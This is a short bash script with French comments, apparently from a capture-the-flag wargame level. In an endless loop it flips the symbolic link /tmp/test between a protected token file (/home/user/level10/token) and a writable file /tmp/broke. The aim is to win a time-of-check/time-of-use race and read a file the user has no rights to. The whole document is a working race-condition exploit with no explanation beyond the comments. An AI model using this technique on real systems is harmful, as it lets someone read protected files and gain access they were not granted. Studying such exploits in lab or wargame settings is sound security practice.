#!/bin/bash

chmod 644 /tmp/broke
chmod 644 /tmp/test

#switch en boucle le lien symbolique /tmp/test
#entre token ou on a pas les droits et broke ou
#on a les droits
while true; do
        ln -sf /home/user/level10/token /tmp/test
        ln -sf /tmp/broke /tmp/test
done